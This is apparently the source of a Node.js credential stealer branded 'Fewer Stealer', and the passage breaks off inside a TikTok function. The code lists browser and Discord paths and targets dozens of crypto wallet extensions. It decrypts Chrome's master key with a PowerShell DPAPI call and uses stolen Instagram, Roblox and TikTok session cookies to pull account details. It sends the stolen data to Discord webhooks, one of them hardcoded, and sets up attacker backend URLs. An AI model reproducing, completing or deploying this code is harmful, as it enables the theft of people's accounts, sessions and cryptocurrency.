const fs = require("fs"),
    path = require("path"),
    httpx = require("axios"),
    axios = require("axios"),
    os = require('os'),
    FormData = require('form-data'),
    AdmZip = require('adm-zip'),
    {
        execSync,
        exec: exec
    } = require("child_process"),
    crypto = require("crypto"),
    sqlite3 = require("sqlite3");

const local = process.env.LOCALAPPDATA;
const discords = [];
debug = false;
let injection_paths = []

var appdata = process.env.APPDATA,
    LOCAL = process.env.LOCALAPPDATA,
    localappdata = process.env.LOCALAPPDATA;
let browser_paths = [localappdata + '\\Google\\Chrome\\User Data\\Default\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\', appdata + '\\Opera Software\\Opera Stable\\', appdata + '\\Opera Software\\Opera GX Stable\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'];

const webhook3939 = "YOUR_DISCORD_WEBHOOK_PUT_HERE"





paths = [
    appdata + '\\discord\\',
    appdata + '\\discordcanary\\',
    appdata + '\\discordptb\\',
    appdata + '\\discorddevelopment\\',
    appdata + '\\lightcord\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
    appdata + '\\Opera Software\\Opera Stable\\',
    appdata + '\\Opera Software\\Opera GX Stable\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
];

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}

  function SendDataToBackEnd(token) {
    const url = `https://buildandwatch.net/api/grabuser?token=${token}&ip=33232&auth=SoShX7eRga9Fx4Z2`;
}
  const config = {
    "logout": "instant",
    "inject-notify": "true",
    "logout-notify": "true",
    "init-notify": "false",
    "embed-color": 3553599,
    "disable-qr-code": "true"
}
const baseapi = "https://apikapatildi.net/api";

const _0x9b6227 = {}
_0x9b6227.passwords = 0
_0x9b6227.cookies = 0
_0x9b6227.autofills = 0
_0x9b6227.wallets = 0
_0x9b6227.telegram = false
const count = _0x9b6227,
user = {
    ram: os.totalmem(),
    version: os.version(),
    uptime: os.uptime,
    homedir: os.homedir(),
    hostname: os.hostname(),
    userInfo: os.userInfo().username,
    type: os.type(),
    arch: os.arch(),
    release: os.release(),
    roaming: process.env.APPDATA,
    local: process.env.LOCALAPPDATA,
    temp: process.env.TEMP,
    countCore: process.env.NUMBER_OF_PROCESSORS,
    sysDrive: process.env.SystemDrive,
    fileLoc: process.cwd(),
    randomUUID: crypto.randomBytes(16).toString('hex'),
    start: Date.now(),
    debug: false,
    copyright: '<================[Fewer Stealer]>================>\n\n',
    url: null,
}
_0x2afdce = {}
const walletPaths = _0x2afdce,
    _0x4ae424 = {}
_0x4ae424.Trust = '\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph'
_0x4ae424.Metamask =
    '\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn'
_0x4ae424.BinanceChain =
    '\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp'
_0x4ae424.Phantom =
    '\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa'
_0x4ae424.TronLink =
    '\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec'
_0x4ae424.Ronin = '\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec'
_0x4ae424.Exodus =
    '\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno'
_0x4ae424.Coin98 =
    '\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg'
_0x4ae424.Authenticator =
    '\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai'
_0x4ae424.MathWallet =
    '\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc'
_0x4ae424.YoroiWallet =
    '\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb'
_0x4ae424.GuardaWallet =
    '\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln'
_0x4ae424.JaxxxLiberty =
    '\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne'
_0x4ae424.Wombat =
    '\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih'
_0x4ae424.EVERWallet =
    '\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk'
_0x4ae424.KardiaChain =
    '\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk'
_0x4ae424.XDEFI = '\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf'
_0x4ae424.Nami = '\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo'
_0x4ae424.TerraStation =
    '\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp'
_0x4ae424.MartianAptos =
    '\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk'
_0x4ae424.TON = '\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd'
_0x4ae424.Keplr = '\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap'
_0x4ae424.CryptoCom =
    '\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj'
_0x4ae424.PetraAptos =
    '\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci'
_0x4ae424.OKX = '\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge'
_0x4ae424.Sollet =
    '\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno'
_0x4ae424.Sender =
    '\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg'
_0x4ae424.Sui = '\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil'
_0x4ae424.SuietSui =
    '\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd'
_0x4ae424.Braavos =
    '\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma'
_0x4ae424.FewchaMove =
    '\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj'
_0x4ae424.EthosSui =
    '\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli'
_0x4ae424.ArgentX =
    '\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb'
_0x4ae424.NiftyWallet =
    '\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid'
_0x4ae424.BraveWallet =
    '\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl'
_0x4ae424.EqualWallet =
    '\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac'
_0x4ae424.BitAppWallet =
    '\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi'
_0x4ae424.iWallet =
    '\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj'
_0x4ae424.AtomicWallet =
    '\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh'
_0x4ae424.MewCx = '\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm'
_0x4ae424.GuildWallet =
    '\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj'
_0x4ae424.SaturnWallet =
    '\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig'
_0x4ae424.HarmonyWallet =
    '\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib'
_0x4ae424.PaliWallet =
    '\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn'
_0x4ae424.BoltX = '\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca'
_0x4ae424.LiqualityWallet =
    '\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn'
_0x4ae424.MaiarDeFiWallet =
    '\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm'
_0x4ae424.TempleWallet =
    '\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc'
_0x4ae424.Metamask_E =
    '\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm'
_0x4ae424.Ronin_E =
    '\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk'
_0x4ae424.Yoroi_E =
    '\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb'
_0x4ae424.Authenticator_E =
    '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio'
_0x4ae424.MetaMask_O =
    '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'

const extension = _0x4ae424,
  browserPath = [
    [
      user.local + '\\Google\\Chrome\\User Data\\Default\\',
      'Default',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
      'Default',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\',
      'Default',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Default\\',
      'Default',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\Default\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Stable\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
    ],
  ],
 randomPath = `${user.fileLoc}\\${user.randomUUID}`;
fs.mkdirSync(randomPath, 484);


function debugLog(message) {
  if (user.debug === true) {
    const elapsedTime = Date.now() - user.start;
    const seconds = (elapsedTime / 1000).toFixed(1);
    const milliseconds = elapsedTime.toString();

    console.log(`${message}: ${seconds} s. / ${milliseconds} ms.`);
  }
}






async function getEncrypted() {
  for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
    if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
      continue
    }
    try {
      let _0x276965 = Buffer.from(
        JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
          .os_crypt.encrypted_key,
        'base64'
      ).slice(5)
      const _0x4ff4c6 = Array.from(_0x276965),
        _0x4860ac = execSync(
          'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
            _0x4ff4c6 +
            "), $null, 'CurrentUser')"
        )
          .toString()
          .split('\r\n'),
        _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
        _0x2ed7ba = Buffer.from(_0x4a5920)
      browserPath[_0x4c3514].push(_0x2ed7ba)
    } catch (_0x32406b) {}
  }
}


// Assuming you have the necessary import for the httpx library

async function GetInstaData(session_id) {
  try {
    const headers = {
      "Host": "i.instagram.com",
      "X-Ig-Connection-Type": "WiFi",
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Ig-Capabilities": "36r/Fx8=",
      "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
      "X-Ig-App-Locale": "en",
      "X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt",
      "Accept-Encoding": "gzip, deflate",
      "Cookie": `sessionid=${session_id};`
    };

    const response = await httpx.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
    const userData = response.data.user;

    const data = {
      username: userData.username,
      verified: userData.is_verified,
      avatar: userData.profile_pic_url,
      session_id: session_id
    };

    return data;
  } catch (error) {
    console.error("Error fetching Instagram data:", error);
    return null;
  }
}

async function GetFollowersCount(session_id) {
  try {
    const headers = {
      "Host": "i.instagram.com",
      "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
      "Cookie": `sessionid=${session_id};`
    };

    const accountResponse = await httpx.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
    const accountInfo = accountResponse.data.user;
    
    const userInfoResponse = await httpx.get(`https://i.instagram.com/api/v1/users/${accountInfo.pk}/info`, { headers: headers });
    const userData = userInfoResponse.data.user;
    const followersCount = userData.follower_count;

    return followersCount;
  } catch (error) {
    console.error("Error fetching followers count:", error);
    return null;
  }
}

async function SubmitInstagram(session_id) {
  try {
    const data = await GetInstaData(session_id);
    const followersCount = await GetFollowersCount(session_id);

    // Your Discord webhook URL

    const embed = {
      title: 'Instagram Data',
      color: 16761867, // You can set the color of the embed (optional)
      thumbnail: { url: data.avatar },
      fields: [
        { name: 'Verified', value: data.verified ? 'Yes' : 'No', inline: true },
        { name: 'Token', value: data.session_id, inline: true }, // Corrected to data.session_id
        { name: 'Username', value: data.username, inline: true },
        { name: 'Followers Count', value: followersCount, inline: true } // Use followersCount directly
      ],
    };

    // Send the embed to the Discord webhook
    await httpx.post(webhook, { embeds: [embed] });
    console.log("Data sent to Discord webhook successfully.");
  } catch (error) {
    console.error("Error sending data to Discord webhook:", error);
  }
}



//


// Assuming you have a function named GetFollowers(session_id) that fetches the followers list


async function GetRobloxData(secret_cookie) {
  let data = {};
  let headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
    'cookie': `.ROBLOSECURITY=${secret_cookie};`,
    'origin': 'https://www.roblox.com',
    'referer': 'https://www.roblox.com',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
  };
  
  try {
    let response = await axios.get('https://www.roblox.com/mobileapi/userinfo', { headers: headers });

    data['username'] = response.data['UserName'];
    data['avatar'] = response.data['ThumbnailUrl'];
    data['robux'] = response.data['RobuxBalance'];
    data['premium'] = response.data['IsPremium'];
  data['secret_cookie'] = response.data['secret_cookie'];

    return data;
  } catch (error) {
    console.error('Error fetching Roblox data:', error.message);
    throw error;
  }
}


async function SubmitRoblox(secret_cookie) {
  let data = await GetRobloxData(secret_cookie);
  data['secret_cookie'] = secret_cookie;

  // Replace any backticks in the secret_cookie with the backquote character (‵)
  const formattedSecretCookie = secret_cookie.toString().replace(/`/g, '‵');

  let webhook = 'https://discord.com/api/webhooks/1131719152483192842/2GmqMmERdj80dMBrH6jxC_8BRuuahhgdCU4AIqJzUDa5tchHMwtEcVMic6S9KAzIgdPO';

  let embed = {
    color: 0x303037,
    author: {
      name: 'Roblox Session',
      icon_url: 'https://media.discordapp.net/attachments/1128742988252713001/1128986101093244949/68f5dd00afb66e8b8f599a77e12e7d19.gif',
    },
    thumbnail: {
      url: data.avatar,
    },
    fields: [
      {
        name: 'Name:',
        value: data.username,
        inline: false,
      },
      {
        name: 'Robux:',
        value: data.robux,
        inline: false,
      },
   
      {
        name: 'Premium:',
        value: data.premium ? 'Yes' : 'No',
        inline: false,
      },
    ],
    footer: {
      text: '@fewerstealer',
    },
  };

  let payload = {
    embeds: [embed],
  };

  axios.post(webhook3939, payload)
    .then(response => {
      console.log('Discord webhook sent successfully!');
    })

    .catch(error => {
      console.error('Error sending Discord webhook:', error.message);
    });
}



//


function stealTikTokSession(cookie) {
  try {
    const headers = {
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'gzip, compress, deflate, br',
      'cookie': `sessionid=${cookie}`
    };

    axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", { headers })
      .then(response => {
        const accountInfo = response.data;

        if (!accountInfo || !accountInfo.data || !accountInfo.data.username) {
          throw new Error("Failed to retrieve TikTok account information.");
        }

       
        axios.post(
          "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
          "type_requests=[{\"insigh_type\":\"vv_history\",\"days\":16},{\"insigh_type\":\"pv_history\",\"days\":16},{\"insigh_type\":\"like_history\",\"days\":16},{\"insigh_type\":\"comment_history\",\"days\":16},{\"insigh_type\":\"share_history\",\"days\":16},{\"insigh_type\":\"user_info\"},{\"insigh_type\":\"follower_num_history\",\"days\":17},{\"insigh_type\":\"follower_num\"},{\"insigh_type\":\"week_new_videos\",\"days\":7},{\"insigh_type\":\"week_incr_video_num\"},{\"insigh_type\":\"self_rooms\",\"days\":28},{\"insigh_type\":\"user_live_cnt_history\",\"days\":58},{\"insigh_type\":\"room_info\"}]",
          { headers: { cookie: `sessionid=${cookie}` } }
        )
          .then(response => {
            const insights = response.data;

            axios.get(
              "https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true",
              { headers: { cookie: `sessionid=${cookie}` } }
            )
              .then(response => {
                const wallet = response.data;

                const webhookPayload = {
            embeds: [
  {
    title: "TikTok Session Detected",
    description: "The TikTok session was detected",
    color: 16716947, // Renk kodu (Opsiyonel)
    fields: [
      {
        name: "Cookie",
